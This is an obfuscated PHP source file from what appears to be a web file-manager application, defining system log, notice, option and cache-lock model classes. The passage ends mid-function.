<?php
 goto Bëë°ê£ŠÉ; E¯Ò¹–ÃÅ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\124\151\155\145", "\x74\151\155\145", "\x69\156\163\145\162\x74", "\146\165\156\x63\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $÷©â¬®ó =& $_SERVER[¹òÍ›æş]; return array($÷©â¬®ó[2192] => LNG($÷©â¬®ó[2193]), $÷©â¬®ó[2194] => LNG($÷©â¬®ó[2195]), $÷©â¬®ó[1802] => LNG($÷©â¬®ó[2196]), $÷©â¬®ó[2197] => LNG($÷©â¬®ó[2198]), $÷©â¬®ó[2199] => LNG($÷©â¬®ó[2200]), $÷©â¬®ó[2201] => LNG($÷©â¬®ó[2202]), $÷©â¬®ó[2203] => LNG($÷©â¬®ó[2204]), $÷©â¬®ó[1832] => LNG($÷©â¬®ó[2204]), $÷©â¬®ó[1833] => LNG($÷©â¬®ó[2205]), $÷©â¬®ó[2206] => LNG($÷©â¬®ó[2207]), $÷©â¬®ó[2208] => LNG($÷©â¬®ó[2209]), $÷©â¬®ó[2210] => LNG($÷©â¬®ó[2211]), $÷©â¬®ó[2212] => LNG($÷©â¬®ó[2213]), $÷©â¬®ó[1830] => LNG($÷©â¬®ó[2214]), $÷©â¬®ó[2215] => LNG($÷©â¬®ó[2216]), $÷©â¬®ó[1837] => LNG($÷©â¬®ó[2217]), $÷©â¬®ó[2218] => LNG($÷©â¬®ó[2219]), $÷©â¬®ó[2220] => LNG($÷©â¬®ó[2221]), $÷©â¬®ó[2222] => LNG($÷©â¬®ó[2223]), $÷©â¬®ó[2224] => LNG($÷©â¬®ó[2225]), $÷©â¬®ó[1840] => LNG($÷©â¬®ó[2226]), $÷©â¬®ó[1841] => LNG($÷©â¬®ó[2227]), $÷©â¬®ó[2228] => LNG($÷©â¬®ó[2229]), $÷©â¬®ó[2230] => LNG($÷©â¬®ó[2231]), $÷©â¬®ó[2232] => LNG($÷©â¬®ó[2233]), $÷©â¬®ó[1835] => LNG($÷©â¬®ó[2234]), $÷©â¬®ó[2235] => LNG($÷©â¬®ó[2236]), $÷©â¬®ó[1834] => LNG($÷©â¬®ó[2237]), $÷©â¬®ó[2238] => LNG($÷©â¬®ó[2239]), $÷©â¬®ó[2240] => LNG($÷©â¬®ó[2241]), $÷©â¬®ó[2242] => LNG($÷©â¬®ó[2243]), $÷©â¬®ó[2244] => LNG($÷©â¬®ó[2244]), $÷©â¬®ó[2245] => LNG($÷©â¬®ó[1806]), $÷©â¬®ó[2246] => LNG($÷©â¬®ó[2247]), $÷©â¬®ó[2248] => LNG($÷©â¬®ó[2249]), $÷©â¬®ó[2250] => LNG($÷©â¬®ó[2251]), $÷©â¬®ó[2252] => LNG($÷©â¬®ó[2253]), $÷©â¬®ó[2254] => LNG($÷©â¬®ó[2255]), $÷©â¬®ó[2256] => LNG($÷©â¬®ó[2256]), $÷©â¬®ó[2257] => LNG($÷©â¬®ó[2258]), $÷©â¬®ó[2259] => LNG($÷©â¬®ó[2260]), $÷©â¬®ó[2261] => LNG($÷©â¬®ó[2262]), $÷©â¬®ó[2263] => LNG($÷©â¬®ó[2264]), $÷©â¬®ó[2265] => LNG($÷©â¬®ó[2266]), $÷©â¬®ó[2267] => LNG($÷©â¬®ó[2268])); } private function typeFile() { $È¦ÂƒŠÁ =& $_SERVER[¹òÍ›æş]; $×Í¥›ªƒ = array($È¦ÂƒŠÁ[1837] => array($È¦ÂƒŠÁ[1838]), $È¦ÂƒŠÁ[2210] => array($È¦ÂƒŠÁ[2269]), $È¦ÂƒŠÁ[2212] => array($È¦ÂƒŠÁ[2270]), $È¦ÂƒŠÁ[1830] => array($È¦ÂƒŠÁ[1831]), $È¦ÂƒŠÁ[2220] => array(), $È¦ÂƒŠÁ[2222] => array(), $È¦ÂƒŠÁ[2224] => array(), $È¦ÂƒŠÁ[1840] => array($È¦ÂƒŠÁ[1842]), $È¦ÂƒŠÁ[1841] => array($È¦ÂƒŠÁ[1842]), $È¦ÂƒŠÁ[2228] => array($È¦ÂƒŠÁ[2271]), $È¦ÂƒŠÁ[2230] => array($È¦ÂƒŠÁ[2271]), $È¦ÂƒŠÁ[2232] => array($È¦ÂƒŠÁ[2272]), $È¦ÂƒŠÁ[2218] => array($È¦ÂƒŠÁ[2273]), $È¦ÂƒŠÁ[1835] => array($È¦ÂƒŠÁ[2274]), $È¦ÂƒŠÁ[2235] => array($È¦ÂƒŠÁ[2275]), $È¦ÂƒŠÁ[1834] => array($È¦ÂƒŠÁ[1836])); return $×Í¥›ªƒ; } private function typeAll() { $•˜Î™§ =& $_SERVER[¹òÍ›æş]; $¶ó±º¦Ú = $this->typeList; $è°Şëê™ = array_filter($this->typeFile()); foreach ($è°Şëê™ as $§©‘•‰‚ => $àºº¬ƒ–) { $¶ó±º¦Ú[$àºº¬ƒ–[0]] = $¶ó±º¦Ú[$§©‘•‰‚]; } $¶ó±º¦Ú[$•˜Î™§[1842]] = LNG($•˜Î™§[2276]); $¶ó±º¦Ú[$•˜Î™§[2271]] = LNG($•˜Î™§[2277]); return $¶ó±º¦Ú; } public function addLog($İİ²åÇ, $‰äı¾å› = array()) { $‘ú÷çŠ› =& $_SERVER[¹òÍ›æş]; if (!isset($this->typeList[$İİ²åÇ])) { return; } $…½…¥Î° = isset($‰äı¾å›[$‘ú÷çŠ›[1669]]) ? $‰äı¾å›[$‘ú÷çŠ›[1669]] : 0; if (!$…½…¥Î°) { $…½…¥Î° = Session::get($‘ú÷çŠ›[1996]); } if ($İİ²åÇ == $‘ú÷çŠ›[2246] && is_array($‰äı¾å›[$‘ú÷çŠ›[2278]]) && !$‰äı¾å›[$‘ú÷çŠ›[2278]]) { return; } $ÁÏÄ²ëÍ = get_client_ip(); if (!$‰äı¾å› || strlen(json_encode($‰äı¾å›)) >= 1024) { $‰äı¾å› = array($‘ú÷çŠ›[2279] => $ÁÏÄ²ëÍ); } else { if (is_array($‰äı¾å›)) { $‰äı¾å›[$‘ú÷çŠ›[2279]] = $ÁÏÄ²ëÍ; } else { $‰äı¾å› = array($‘ú÷çŠ›[1229] => $‰äı¾å›, $‘ú÷çŠ›[2279] => $ÁÏÄ²ëÍ); } } $‰äı¾å› = array($‘ú÷çŠ›[1659] => Session::sign(), $‘ú÷çŠ›[1660] => intval($…½…¥Î°), $‘ú÷çŠ›[33] => $İİ²åÇ, $‘ú÷çŠ›[1662] => json_encode($‰äı¾å›)); parent::add($‰äı¾å›); } public function remove($¢€·¸¦) { $this->where(array($_SERVER[¹òÍ›æş][457] => $¢€·¸¦))->delete(); } private function _makeOrder($¼¸®ö§ = '') { $™ØûÙ‰‡ =& $_SERVER[¹òÍ›æş]; $Ê¥ë–³¶ = $™ØûÙ‰‡[211]; $¤ÎØ¶À = array($™ØûÙ‰‡[488] => $™ØûÙ‰‡[489], $™ØûÙ‰‡[490] => $™ØûÙ‰‡[491]); $ çŞ°Íƒ = Input::get($™ØûÙ‰‡[496], $™ØûÙ‰‡[7], $™ØûÙ‰‡[2032], array($™ØûÙ‰‡[1950], $™ØûÙ‰‡[490])); $ çŞ°Íƒ = $¤ÎØ¶À[$ çŞ°Íƒ]; $¼¸®ö§ = $¼¸®ö§ . "{$Ê¥ë–³¶}\40{$ çŞ°Íƒ}"; return $this->order($¼¸®ö§); } public function get($Â¦€¾¶î = '') { $Ëçãûµê =& $_SERVER[¹òÍ›æş]; if (!$Â¦€¾¶î) { show_json(array()); } $ıÉŸ¿íæ = array(); if ($Â¦€¾¶î[$Ëçãûµê[1669]]) { $ıÉŸ¿íæ[$Ëçãûµê[1669]] = $Â¦€¾¶î[$Ëçãûµê[1669]]; } if (isset($Â¦€¾¶î[$Ëçãûµê[790]])) { $²ºàÉòà = $Â¦€¾¶î[$Ëçãûµê[790]]; $²€Ã³‚ = isset($Â¦€¾¶î[$Ëçãûµê[791]]) ? $Â¦€¾¶î[$Ëçãûµê[791]] : time(); $ıÉŸ¿íæ[$Ëçãûµê[211]] = array($Ëçãûµê[371], array($²ºàÉòà, $²€Ã³‚)); } if ($Â¦€¾¶î[$Ëçãûµê[33]]) { $»Ãñ†°ã = explode($Ëçãûµê[50], $Â¦€¾¶î[$Ëçãûµê[33]]); $‡¦ßÃ = $this->typeFile(); $†ıØ„à¢ = array(); foreach ($»Ãñ†°ã as $çÏµï°Ã) { $†ıØ„à¢[] = $çÏµï°Ã; if (isset($‡¦ßÃ[$çÏµï°Ã])) { $†ıØ„à¢ = array_merge($†ıØ„à¢, $‡¦ßÃ[$çÏµï°Ã]); } } $†ıØ„à¢ = array_unique($†ıØ„à¢); if ($†ıØ„à¢) { $ıÉŸ¿íæ[$Ëçãûµê[33]] = array($Ëçãûµê[7], $†ıØ„à¢); } } else { $ıÉŸ¿íæ[$Ëçãûµê[33]] = array($Ëçãûµê[2280], $Ëçãûµê[2281]); } if (!empty($Â¦€¾¶î[$Ëçãûµê[2279]])) { $ıÉŸ¿íæ[$Ëçãûµê[491]] = array($Ëçãûµê[421], "\x25{$Â¦€¾¶î[$Ëçãûµê[2279]]}\x25"); } $°«“öÛØ = $this->_makeOrder()->where($ıÉŸ¿íæ)->selectPage(); if (empty($°«“öÛØ[$Ëçãûµê[407]])) { show_json(array(), !0, $°«“öÛØ[$Ëçãûµê[404]]); } $°«“öÛØ[$Ëçãûµê[407]] = $this->logList($°«“öÛØ[$Ëçãûµê[407]]); return $°«“öÛØ; } private function ipAddress(&$Ğ«…•¡Ñ) { $á¡‡¦Â =& $_SERVER[¹òÍ›æş]; if (!empty($Ğ«…•¡Ñ[$á¡‡¦Â[2279]])) { $ËÒ§« = IpLocation::get($Ğ«…•¡Ñ[$á¡‡¦Â[2279]]); } else { $ËÒ§« = LNG($á¡‡¦Â[2282]); } $Ğ«…•¡Ñ[$á¡‡¦Â[2283]] = $ËÒ§«; } private function descZipDownload($ú™Ëäãü, &$»Í åè˜) { $××õ­©õ =& $_SERVER[¹òÍ›æş]; if (!isset($ú™Ëäãü[$××õ­©õ[2284]])) { return; } $ìÒáşèŞ = json_decode($ú™Ëäãü[$××õ­©õ[2284]], !0); foreach ($ìÒáşèŞ as $‡à»º ) { try { $Ÿ€Îáµ = IO::infoFull($‡à»º [$××õ­©õ[94]]); } catch (Exception $òöé×ñØ) { continue; } $ú™Ëäãü[$××õ­©õ[94]] = $‡à»º [$××õ­©õ[94]]; $»Í åè˜[] = $ú™Ëäãü[$××õ­©õ[440]] = $Ÿ€Îáµ[$××õ­©õ[440]]; $»Í åè˜[] = $ú™Ëäãü[$××õ­©õ[2087]] = $Ÿ€Îáµ[$××õ­©õ[470]]; break; } return $ú™Ëäãü; } private function getSourceList(&$Í†š­ ë) { $¯Ùãâ½ó =& $_SERVER[¹òÍ›æş]; $Ô­¶õ = array(); foreach ($Í†š­ ë as $É­ç«ß => $˜ì´•æ·) { $Ûèë²–É = json_decode($˜ì´•æ·[$¯Ùãâ½ó[491]], !0); if ($˜ì´•æ·[$¯Ùãâ½ó[33]] == $¯Ùãâ½ó[1833]) { $Ûèë²–É = $this->descZipDownload($Ûèë²–É, $Ô­¶õ); $Í†š­ ë[$É­ç«ß][$¯Ùãâ½ó[491]] = json_encode($Ûèë²–É); continue; } if (strpos($˜ì´•æ·[$¯Ùãâ½ó[33]], $¯Ùãâ½ó[2089]) !== 0) { if (!isset($Ûèë²–É[$¯Ùãâ½ó[94]]) || strpos($˜ì´•æ·[$¯Ùãâ½ó[33]], $¯Ùãâ½ó[2285]) !== 0) { continue; } try { $÷ñ›ß”€ = IO::infoFull($Ûèë²–É[$¯Ùãâ½ó[94]]); } catch (Exception $üöÈÔ‰¸) { continue; } $Ô­¶õ[] = $Ûèë²–É[$¯Ùãâ½ó[440]] = $÷ñ›ß”€[$¯Ùãâ½ó[440]]; $Ô­¶õ[] = $Ûèë²–É[$¯Ùãâ½ó[2087]] = $÷ñ›ß”€[$¯Ùãâ½ó[470]]; $Í†š­ ë[$É­ç«ß][$¯Ùãâ½ó[491]] = json_encode($Ûèë²–É); continue; } $Ô­¶õ[] = $Ûèë²–É[$¯Ùãâ½ó[440]]; $Ô­¶õ[] = $Ûèë²–É[$¯Ùãâ½ó[2087]]; if ($Ûèë²–É[$¯Ùãâ½ó[33]] == $¯Ùãâ½ó[586]) { $Ô­¶õ[] = $Ûèë²–É[$¯Ùãâ½ó[491]][$¯Ùãâ½ó[1187]]; $Ô­¶õ[] = $Ûèë²–É[$¯Ùãâ½ó[491]][$¯Ùãâ½ó[1188]]; } if ($Ûèë²–É[$¯Ùãâ½ó[33]] == $¯Ùãâ½ó[2097]) { $Ô­¶õ[] = $Ûèë²–É[$¯Ùãâ½ó[491]][$¯Ùãâ½ó[440]]; } } if (!$Ô­¶õ) { return array(); } return Model($¯Ùãâ½ó[855])->sourceListInfo($Ô­¶õ, !0); } private function logList($Çäáüà) { $ç€Ã®ËÀ =& $_SERVER[¹òÍ›æş]; $ÑŸøÑ¦· = array_to_keyvalue($Çäáüà, $ç€Ã®ËÀ[12], $ç€Ã®ËÀ[1669]); $œ¼ÌìäÏ = Model($ç€Ã®ËÀ[563])->userListInfo(array_unique($ÑŸøÑ¦·)); $æøÔ½åş = $this->getSourceList($Çäáüà); $Ã¡ŞéË’ = $this->typeAll(); $èû½Ò• = array(); $µ¡©‘ËÖ = array(); foreach ($Çäáüà as $ß²ÓÂ”“ => $åÒ†äß) { $—ˆĞ‡ö‰ = $åÒ†äß[$ç€Ã®ËÀ[33]]; $ıô“¦àÚ = isset($œ¼ÌìäÏ[$åÒ†äß[$ç€Ã®ËÀ[1669]]]) ? $œ¼ÌìäÏ[$åÒ†äß[$ç€Ã®ËÀ[1669]]] : !1; $ø•¯ı†— = strpos($—ˆĞ‡ö‰, $ç€Ã®ËÀ[2286]) === 0 ? LNG($ç€Ã®ËÀ[2287]) : LNG($ç€Ã®ËÀ[2282]); $åÒ†äß[$ç€Ã®ËÀ[32]] = isset($ıô“¦àÚ[$ç€Ã®ËÀ[32]]) ? $ıô“¦àÚ[$ç€Ã®ËÀ[32]] : LNG($ç€Ã®ËÀ[2282]); $åÒ†äß[$ç€Ã®ËÀ[570]] = isset($ıô“¦àÚ[$ç€Ã®ËÀ[570]]) ? $ıô“¦àÚ[$ç€Ã®ËÀ[570]] : $ç€Ã®ËÀ[12]; $åÒ†äß[$ç€Ã®ËÀ[1569]] = isset($Ã¡ŞéË’[$—ˆĞ‡ö‰]) ? $Ã¡ŞéË’[$—ˆĞ‡ö‰] : $ø•¯ı†—; $åÒ†äß[$ç€Ã®ËÀ[2031]] = $ıô“¦àÚ; $‹¯¬ø‡¬ = json_decode($åÒ†äß[$ç€Ã®ËÀ[491]], !0); $åÒ†äß[$ç€Ã®ËÀ[2279]] = isset($‹¯¬ø‡¬[$ç€Ã®ËÀ[2279]]) ? $‹¯¬ø‡¬[$ç€Ã®ËÀ[2279]] : $ç€Ã®ËÀ[12]; $åÒ†äß[$ç€Ã®ËÀ[2283]] = IpLocation::get($åÒ†äß[$ç€Ã®ËÀ[2279]]); if (strpos($—ˆĞ‡ö‰, $ç€Ã®ËÀ[2089]) === 0 || isset($‹¯¬ø‡¬[$ç€Ã®ËÀ[2087]])) { $‹¯¬ø‡¬[$ç€Ã®ËÀ[97]] = $æøÔ½åş[$‹¯¬ø‡¬[$ç€Ã®ËÀ[440]]]; $‹¯¬ø‡¬[$ç€Ã®ËÀ[2102]] = $æøÔ½åş[$‹¯¬ø‡¬[$ç€Ã®ËÀ[2087]]]; if ($‹¯¬ø‡¬[$ç€Ã®ËÀ[33]] == $ç€Ã®ËÀ[586]) { $‹¯¬ø‡¬[$ç€Ã®ËÀ[491]][$ç€Ã®ËÀ[1187]] = $æøÔ½åş[$‹¯¬ø‡¬[$ç€Ã®ËÀ[491]][$ç€Ã®ËÀ[1187]]]; $‹¯¬ø‡¬[$ç€Ã®ËÀ[491]][$ç€Ã®ËÀ[1188]] = $æøÔ½åş[$‹¯¬ø‡¬[$ç€Ã®ËÀ[491]][$ç€Ã®ËÀ[1188]]]; } if ($‹¯¬ø‡¬[$ç€Ã®ËÀ[33]] == $ç€Ã®ËÀ[2097]) { $‹¯¬ø‡¬[$ç€Ã®ËÀ[491]][$ç€Ã®ËÀ[440]] = $æøÔ½åş[$‹¯¬ø‡¬[$ç€Ã®ËÀ[491]][$ç€Ã®ËÀ[440]]]; } if ($‹¯¬ø‡¬[$ç€Ã®ËÀ[33]] == $ç€Ã®ËÀ[1828]) { $‹¯¬ø‡¬[$ç€Ã®ËÀ[2102]] = $‹¯¬ø‡¬[$ç€Ã®ËÀ[97]]; $‹¯¬ø‡¬[$ç€Ã®ËÀ[2087]] = $‹¯¬ø‡¬[$ç€Ã®ËÀ[2102]][$ç€Ã®ËÀ[440]]; $‹¯¬ø‡¬[$ç€Ã®ËÀ[97]] = !1; $‹¯¬ø‡¬[$ç€Ã®ËÀ[440]] = $ç€Ã®ËÀ[12]; } if ($‹¯¬ø‡¬[$ç€Ã®ËÀ[97]] && $‹¯¬ø‡¬[$ç€Ã®ËÀ[97]][$ç€Ã®ËÀ[449]] == $ç€Ã®ËÀ[1314]) { $µ¡©‘ËÖ[] = $åÒ†äß[$ç€Ã®ËÀ[437]]; unset($Çäáüà[$ß²ÓÂ”“]); continue; } if ($‹¯¬ø‡¬[$ç€Ã®ËÀ[2102]] && $‹¯¬ø‡¬[$ç€Ã®ËÀ[2102]][$ç€Ã®ËÀ[449]] == $ç€Ã®ËÀ[1314]) { $µ¡©‘ËÖ[] = $åÒ†äß[$ç€Ã®ËÀ[437]]; unset($Çäáüà[$ß²ÓÂ”“]); continue; } } $åÒ†äß[$ç€Ã®ËÀ[491]] = $‹¯¬ø‡¬; unset($åÒ†äß[$ç€Ã®ËÀ[2288]]); $èû½Ò•[] = $åÒ†äß; } $this->clearSystemPathLog($µ¡©‘ËÖ); return $èû½Ò•; } private function clearSystemPathLog($Ùè¼´ßï) { $ƒÈ–Ÿ‘ë =& $_SERVER[¹òÍ›æş]; if (count($Ùè¼´ßï) == 0) { return; } $Ô‚¼…÷‘ = array($ƒÈ–Ÿ‘ë[437] => array($ƒÈ–Ÿ‘ë[7], array_unique($Ùè¼´ßï))); $this->where($Ô‚¼…÷‘)->delete(); } public function deviceList($¬ˆÏÉ»«, $ô¦ŠÇúø = 0) { $ùÎÓ·¢Ñ =& $_SERVER[¹òÍ›æş]; $ÊÁª–¡ = array($ùÎÓ·¢Ñ[1669] => $¬ˆÏÉ»«, $ùÎÓ·¢Ñ[211] => array($ùÎÓ·¢Ñ[1041], $ô¦ŠÇúø), $ùÎÓ·¢Ñ[33] => $ùÎÓ·¢Ñ[1802]); $—¢ğÀûº = array(); $¢•Œ„Ôü = $this->field($ùÎÓ·¢Ñ[2289])->where($ÊÁª–¡)->order($ùÎÓ·¢Ñ[2100])->limit(50)->select(); foreach ($¢•Œ„Ôü as $±Áõ­ã‘ => $ÂÏÒÈ) { if ($±Áõ­ã‘ > 0 && abs($ÂÏÒÈ[$ùÎÓ·¢Ñ[211]] - $¢•Œ„Ôü[$±Áõ­ã‘ - 1][$ùÎÓ·¢Ñ[211]]) < 5) { continue; } $Õ‰ÆÄş‡ = json_decode($ÂÏÒÈ[$ùÎÓ·¢Ñ[491]], !0); $ÂÏÒÈ[$ùÎÓ·¢Ñ[2279]] = isset($Õ‰ÆÄş‡[$ùÎÓ·¢Ñ[2279]]) ? $Õ‰ÆÄş‡[$ùÎÓ·¢Ñ[2279]] : $ùÎÓ·¢Ñ[12]; unset($Õ‰ÆÄş‡[$ùÎÓ·¢Ñ[2279]]); $—Î‡ª° = $this->deviceType($Õ‰ÆÄş‡[$ùÎÓ·¢Ñ[2090]]); if (isset($—¢ğÀûº[$—Î‡ª°])) { continue; } $ÂÏÒÈ[$ùÎÓ·¢Ñ[2283]] = IpLocation::get($ÂÏÒÈ[$ùÎÓ·¢Ñ[2279]]); $ÂÏÒÈ[$ùÎÓ·¢Ñ[491]] = $Õ‰ÆÄş‡; $—¢ğÀûº[$—Î‡ª°] = $ÂÏÒÈ; } return array_values($—¢ğÀûº); } public function deviceType($Úíşí·) { return $Úíşí·; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\156\157\x74\x69\x63\x65\114\151\163\x74"; public $field = array("\x6e\141\155\145", "\143\x6f\x6e\x74\145\x6e\164", "\x61\x75\164\150", "\x6d\157\x64\145", "\x74\151\155\x65", "\164\x79\x70\x65", "\154\145\166\x65\x6c", "\145\x6e\141\x62\154\145", "\163\x6f\x72\x74"); public function listData($¶¿€Ì–» = false, $¦‚ûÅÛê = "\163\x6f\x72\x74", $¥Õ“ŞÛ = false) { return parent::listData($¶¿€Ì–», $¦‚ûÅÛê, $¥Õ“ŞÛ); } public function add($¼«ıñ¹) { $‡éüşÅ” =& $_SERVER[¹òÍ›æş]; $ËÓáìê = time(); if ($¼«ıñ¹[$‡éüşÅ”[16]] == $‡éüşÅ”[2290]) { $ËÓáìê = strtotime($¼«ıñ¹[$‡éüşÅ”[190]]); } $¼«ıñ¹[$‡éüşÅ”[190]] = $ËÓáìê; return parent::insert($¼«ıñ¹); } public function update($è–ô‰‰º, $†ÇÏ®ò¹) { $¥ëÓşÓ¬ =& $_SERVER[¹òÍ›æş]; $İıáâ“ = $this->listData($è–ô‰‰º); if (!$İıáâ“) { return !1; } $êñ»Ê‘š = time(); if ($†ÇÏ®ò¹[$¥ëÓşÓ¬[16]] == $¥ëÓşÓ¬[2290]) { $êñ»Ê‘š = strtotime($†ÇÏ®ò¹[$¥ëÓşÓ¬[190]]); } $†ÇÏ®ò¹[$¥ëÓşÓ¬[190]] = $êñ»Ê‘š; return parent::update($è–ô‰‰º, $†ÇÏ®ò¹); } public function remove($†¬¾ß¥ì) { $±Â÷±ó = $this->listData($†¬¾ß¥ì); if (!$±Â÷±ó || $±Â÷±ó[$_SERVER[¹òÍ›æş][1314]]) { return !1; } return parent::remove($†¬¾ß¥ì); } public function sort($ï¡÷¿‡×, $óÌ½ºİ ) { return parent::update($ï¡÷¿‡×, $óÌ½ºİ ); } public function enable($ÑÎ¼‚¤Î, $†ãš¿í) { return parent::update($ÑÎ¼‚¤Î, array($_SERVER[¹òÍ›æş][2291] => $†ãš¿í)); } private function initUserOption() { $€çè“†Ù =& $_SERVER[¹òÍ›æş]; $this->optionType = $€çè“†Ù[2292]; $this->modelType = $€çè“†Ù[2293]; $this->field = array($€çè“†Ù[2294], $€çè“†Ù[32], $€çè“†Ù[190], $€çè“†Ù[33], $€çè“†Ù[2295], $€çè“†Ù[780], $€çè“†Ù[206]); } public function userNoticeGet($«Â­Ì£İ = false) { $this->initUserOption(); return parent::listData($«Â­Ì£İ, $_SERVER[¹òÍ›æş][437], !0); } public function userNoticeAdd($âï«çŠ) { $ƒÆÙÙ¸“ =& $_SERVER[¹òÍ›æş]; $this->initUserOption(); $Ğ¼ó½•µ = $this->findByKey($ƒÆÙÙ¸“[2294], $âï«çŠ[$ƒÆÙÙ¸“[437]]); if ($Ğ¼ó½•µ) { return !0; } $¸·ÙŞ´¼ = array($ƒÆÙÙ¸“[2294] => $âï«çŠ[$ƒÆÙÙ¸“[437]], $ƒÆÙÙ¸“[32] => $âï«çŠ[$ƒÆÙÙ¸“[32]], $ƒÆÙÙ¸“[190] => $âï«çŠ[$ƒÆÙÙ¸“[190]], $ƒÆÙÙ¸“[33] => isset($âï«çŠ[$ƒÆÙÙ¸“[33]]) ? $âï«çŠ[$ƒÆÙÙ¸“[33]] : 1, $ƒÆÙÙ¸“[2295] => isset($âï«çŠ[$ƒÆÙÙ¸“[2295]]) ? $âï«çŠ[$ƒÆÙÙ¸“[2295]] : 0, $ƒÆÙÙ¸“[780] => 0, $ƒÆÙÙ¸“[206] => 0); return parent::insert($¸·ÙŞ´¼); } public function userNoticeEdit($×™º¹Ÿ¤, $»µÀ’í) { $this->initUserOption(); return parent::update($×™º¹Ÿ¤, $»µÀ’í); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\x6d\137\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\157\154\x65", "\x72\157\x6c\x65\x47\162\x6f\165\160", "\x72\145\147\x69\163\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($˜ãä·È¸) { return "\x53\x79\x73\164\145\155\117\x70\x74\x69\157\156\x5f{$˜ãä·È¸}"; } protected function optionDefault($©èÙıÀ  = '') { $“ƒ–Ë€ =& $_SERVER[¹òÍ›æş]; if ($©èÙıÀ  == $“ƒ–Ë€[12]) { return $GLOBALS[$“ƒ–Ë€[6]][$“ƒ–Ë€[419]]; } } } goto CŒÈƒÂğß‰; eøÁ¸õ’ôƒ: class CacheLockMemcached { public function lock($ˆœ‰Ì¾™, $½¦Ò““´ = 0) { $³†™§šª = Cache::init(); $Š×ÑîœØ = microtime(!0) + $½¦Ò““´; while (microtime(!0) < $Š×ÑîœØ) { $¸šƒ¤²² = $³†™§šª->get($ˆœ‰Ì¾™); if (!$¸šƒ¤²² || $¸šƒ¤²² < microtime(!0)) { $éä…²ëù = $³†™§šª->handle->add($ˆœ‰Ì¾™, $Š×ÑîœØ, $½¦Ò““´); if ($éä…²ëù) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($â’ûÔÂ‹) { return Cache::init()->get($â’ûÔÂ‹); } public function unlock($‘úİÔ„ù) { return Cache::init()->remove($‘úİÔ„ù); } } class CacheLockDatabase { public function lock($æ¿Ù˜œ, $•™Ş‚ô’ = 0) { $×‹Í×ö = Model($_SERVER[¹òÍ›æş][859]); $¿’ÚÈ¢Å = microtime(!0) + $•™Ş‚ô’; while (microtime(!0) < $¿’ÚÈ¢Å) { $ãº×†Àí = $×‹Í×ö->get($æ¿Ù˜œ); if (!$ãº×†Àí || $ãº×†Àí < microtime(!0)) { $‰É—õÔ‹ = $×‹Í×ö->set($æ¿Ù˜œ, $¿’ÚÈ¢Å); if ($‰É—õÔ‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ù”†úß) { return Model($_SERVER[¹òÍ›æş][859])->get($Ù”†úß); } public function unlock($ãÎÕƒ”å) { Model($_SERVER[¹òÍ›æş][859])->remove($ãÎÕƒ”å); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¶¤ó“¬, $¤ıÂÜ©ü) { $ûö’Ú¨Ë =& $_SERVER[¹òÍ›æş]; if (!class_exists($ûö’Ú¨Ë[896])) { show_json($ûö’Ú¨Ë[897], !1); } $this->cacheTime = $¤ıÂÜ©ü; $this->handle = new Memcached(); if (is_array($¶¤ó“¬[$ûö’Ú¨Ë[898]]) && count($¶¤ó“¬[$ûö’Ú¨Ë[898]]) >= 1) { foreach ($¶¤ó“¬[$ûö’Ú¨Ë[898]] as $¯Æ’¡¾æ) { $Ò¯ÔÉ£€ = explode($ûö’Ú¨Ë[4], $¯Æ’¡¾æ); $this->handle->addServer($Ò¯ÔÉ£€[0], $Ò¯ÔÉ£€[1]); } } else { $this->handle->addServer($¶¤ó“¬[$ûö’Ú¨Ë[192]], $¶¤ó“¬[$ûö’Ú¨Ë[193]]); } } public function set($¸–Úîõö, $Õ°æà–, $“™Í°Á = false) { $“™Í°Á = $“™Í°Á ? $“™Í°Á : $this->cacheTime; return $this->handle->set($¸–Úîõö, $Õ°æà–, $“™Í°Á); } public function get($Õ•¯ªø‹) { return $this->handle->get($Õ•¯ªø‹); } public function remove($€Å±ù£) { return $this->handle->delete($€Å±ù£); } public function deleteAll() { return $this->handle->flush(); } } goto E›ÌÈå‡Ş; f›Š”†éß§: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\145\x6d\x4f\160\164\151\x6f\156"; public $field = array(); public function listData($¬óî¶áä = false, $ÂÒµğ‚¶ = "\155\x6f\x64\x69\x66\x79\x54\x69\155\145", $˜˜¹ò”š = false) { $ıñàŞõé = Model($this->modelType)->get(!1, $this->optionType, !0); $÷œş¥İ¾ = array_values($ıñàŞõé); if ($÷œş¥İ¾ && $÷œş¥İ¾[0] && !is_array($÷œş¥İ¾[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ıñàŞõé = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ıñàŞõé) { return $¬óî¶áä ? null : array(); } if (!$¬óî¶áä) { $ıñàŞõé = array_filter(array_values($ıñàŞõé)); return array_sort_by($ıñàŞõé, $ÂÒµğ‚¶, $˜˜¹ò”š); } return $ıñàŞõé[$_SERVER[¹òÍ›æş][434] . $¬óî¶áä]; } public function insert($Ù‚åÒÅü) { $Š »ßı =& $_SERVER[¹òÍ›æş]; $Ù‚åÒÅü = array_field_key($Ù‚åÒÅü, $this->field); $ÄÖç†¶¹ = Model($this->modelType)->get($Š »ßı[435], $this->optionType . $Š »ßı[436]); $ÄÖç†¶¹ = $ÄÖç†¶¹ ? $ÄÖç†¶¹ : 0; $Ù‚åÒÅü[$Š »ßı[437]] = ++$ÄÖç†¶¹; $Ù‚åÒÅü[$Š »ßı[211]] = time(); $Ù‚åÒÅü[$Š »ßı[95]] = time(); Model($this->modelType)->set($Š »ßı[435], $ÄÖç†¶¹, $this->optionType . $Š »ßı[436]); Model($this->modelType)->set($Š »ßı[434] . $ÄÖç†¶¹, $Ù‚åÒÅü, $this->optionType); return $ÄÖç†¶¹; } public function update($œ³ÜüÜÜ, $¹¼¹œÎë) { $ÕãĞ =& $_SERVER[¹òÍ›æş]; $¹¼¹œÎë = array_field_key($¹¼¹œÎë, $this->field); $‚Ãİ‰õ = 